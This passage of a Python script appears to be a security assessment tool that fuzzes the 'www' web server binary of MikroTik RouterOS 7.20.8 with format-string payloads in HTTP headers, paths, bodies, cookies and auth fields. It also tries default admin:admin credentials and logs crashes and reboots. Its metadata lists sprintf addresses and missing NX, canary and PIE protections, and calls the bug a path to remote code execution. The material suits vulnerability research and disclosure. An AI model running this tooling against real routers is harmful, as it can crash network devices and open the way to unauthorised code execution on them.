        },
        {
            "name": "prepost_rest_ptr",
            "path": "/rest/system/resource",
            "header": "User-Agent",
            "payload": "%p%p%p%p%p%p%p%p",
        },
    ]

    for test_config in comparison_tests:
        test_name = test_config["name"]
        path = test_config["path"]
        header = test_config["header"]
        payload = test_config["payload"]

        results = {}
        for auth_mode in ["no_auth", "with_auth"]:
            use_auth = auth_mode == "with_auth"

            # Raw socket
            auth_header = ""
            if use_auth:
                b64 = base64.b64encode(b"admin:admin").decode()
                auth_header = f"Authorization: Basic {b64}\r\n"

            raw_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"{header}: {payload}\r\n"
                f"{auth_header}"
                f"Connection: close\r\n"
                f"\r\n"
            )
            resp_raw = raw_http(TARGET, PORT, raw_req, timeout=5)

            analysis = analyze_response(resp_raw, None, test_name, payload)
            results[auth_mode] = {
                "status_code": analysis["status_code"],
                "response_length": analysis["response_length"],
                "leaked_data": analysis["leaked_data"],
                "anomaly": analysis["response_anomaly"],
                "details": analysis["details"],
                "response_snippet": truncate_for_evidence(
                    resp_raw.decode('latin-1', errors='replace') if resp_raw else ""),
            }
            time.sleep(0.2)

        # Compare pre-auth vs post-auth
        pre = results["no_auth"]
        post = results["with_auth"]
        behavior_differs = (
            pre["status_code"] != post["status_code"]
            or abs((pre["response_length"] or 0) - (post["response_length"] or 0)) > 50
            or pre["leaked_data"] != post["leaked_data"]
        )

        is_anomaly = pre["anomaly"] or post["anomaly"] or behavior_differs

        # Record as two tests (one pre-auth, one post-auth)
        for auth_mode in ["no_auth", "with_auth"]:
            sub_name = f"{test_name}_{auth_mode}"
            ec.add_test(
                category="preauth_postauth_comparison",
                name=sub_name,
                description=f"{path} {header}={payload} ({auth_mode})",
                result="ANOMALY" if results[auth_mode]["anomaly"] else "NO_LEAK",
                details={
                    "path": path,
                    "header": header,
                    "payload": payload,
                    "auth_mode": auth_mode,
                    "response": results[auth_mode],
                    "behavior_differs_from_counterpart": behavior_differs,
                    "comparison_summary": {
                        "no_auth_status": pre["status_code"],
                        "with_auth_status": post["status_code"],
                        "no_auth_length": pre["response_length"],
                        "with_auth_length": post["response_length"],
                        "no_auth_leaks": pre["leaked_data"],
                        "with_auth_leaks": post["leaked_data"],
                    },
                },
                anomaly=results[auth_mode]["anomaly"],
            )

        if behavior_differs:
            log(f"    Pre/post-auth behavior DIFFERS for {test_name}:")
            log(f"      No-auth: status={pre['status_code']}, len={pre['response_length']}")
            log(f"      Auth:    status={post['status_code']}, len={post['response_length']}")


# =============================================================================
# MAIN
# =============================================================================

def main():
    log("=" * 70)
    log("MikroTik RouterOS CHR 7.20.8 — www Binary Format String Assessment")
    log(f"Target: {TARGET}:{PORT}")
    log(f"Auth: {ADMIN_USER}/{ADMIN_PASS}")
    log(f"Evidence: {EVIDENCE_DIR / 'attack_www_formatstring.json'}")
    log("=" * 70)

    # ── Pre-flight checks ───────────────────────────────────────────────────
    log("\nPre-flight: checking router connectivity...")
    status = check_router_alive(timeout=5)
    if not status.get("alive"):
        log("FATAL: Router at {TARGET} is not responding. Aborting.")
        sys.exit(1)
    log(f"  Router alive: version={status.get('version')}, uptime={status.get('uptime')}")

    initial_uptime = status.get("uptime")
    ec.results["metadata"]["target"] = TARGET
    ec.results["metadata"]["initial_uptime"] = initial_uptime
    ec.results["metadata"]["binary_info"] = {
        "name": "www",
        "sprintf_plt": "0x804e160",
        "call_sites": ["0x8052bcf", "0x805ca6d"],
        "protections": {"NX": False, "stack_canary": False, "PIE": False},
        "arch": "x86 (32-bit)",
    }

    # ── Run all test phases ─────────────────────────────────────────────────
    try:
        test_header_format_strings()          # ~48 tests
        test_url_path_format_strings()        # ~4 tests
        test_json_body_format_strings()       # ~4 tests
        test_query_param_format_strings()     # ~4 tests
        test_cookie_format_strings()          # ~4 tests
        test_basic_auth_format_strings()      # ~4 tests
        test_preauth_vs_postauth()            # ~8 tests
    except KeyboardInterrupt:
        log("\nInterrupted by user. Saving partial results...")
    except Exception as e:
        log(f"\nUnexpected error: {e}")
        import traceback
        traceback.print_exc()

    # ── Global crash summary ────────────────────────────────────────────────
    ec.results["metadata"]["crash_count"] = CRASH_COUNT
    ec.results["metadata"]["crash_detected"] = CRASH_DETECTED

    if CRASH_COUNT > 0:
        ec.add_finding(
            severity="HIGH",
            title=f"www binary crashed {CRASH_COUNT} time(s) during format string testing",
            description=(
                f"The MikroTik www binary crashed/caused router reboot {CRASH_COUNT} time(s) "
                f"when format string specifiers were injected via HTTP. The binary has no "
                f"stack canary, no NX, and no PIE — format string vulnerabilities in this "
                f"binary are directly exploitable for arbitrary code execution. "
                f"sprintf at PLT 0x804e160 with call sites at 0x8052bcf and 0x805ca6d."
            ),
            cwe="CWE-134",
            cvss="9.8",
            reproduction_steps=[
                f"1. Target: MikroTik RouterOS CHR 7.20.8 at {TARGET}",
                "2. Send HTTP request with format specifiers (%n, %s) in headers/path",
                "3. Monitor router uptime for reboot indication",
                "4. www binary lacks NX/canary/PIE — any format string vuln is RCE",
            ],
        )

    # ── Summary ─────────────────────────────────────────────────────────────
    log("\n" + "=" * 70)
    log("ASSESSMENT SUMMARY")
    log("=" * 70)

    total = ec.results["metadata"]["total_tests"]
    anomalies = ec.results["metadata"]["anomalies"]
    findings = len(ec.results["findings"])

    log(f"  Total tests:     {total}")
    log(f"  Anomalies:       {anomalies}")
    log(f"  Findings:        {findings}")
    log(f"  Crashes:         {CRASH_COUNT}")
    log(f"  Initial uptime:  {initial_uptime}")
    log(f"  Final uptime:    {get_uptime()}")

    # Breakdown by category
    categories = {}
    for t in ec.results["tests"]:
        cat = t.get("category", "unknown")
        categories.setdefault(cat, {"total": 0, "anomalies": 0})
        categories[cat]["total"] += 1
        if t.get("anomaly"):
            categories[cat]["anomalies"] += 1

    log("\n  Results by category:")
    for cat, stats in sorted(categories.items()):
        log(f"    {cat}: {stats['total']} tests, {stats['anomalies']} anomalies")

    if findings > 0:
        log("\n  Findings:")
        for f in ec.results["findings"]:
            log(f"    [{f['severity']}] {f['title']}")

    # ── Save evidence ───────────────────────────────────────────────────────
    ec.save("attack_www_formatstring.json")
    ec.summary()


if __name__ == "__main__":
    main()
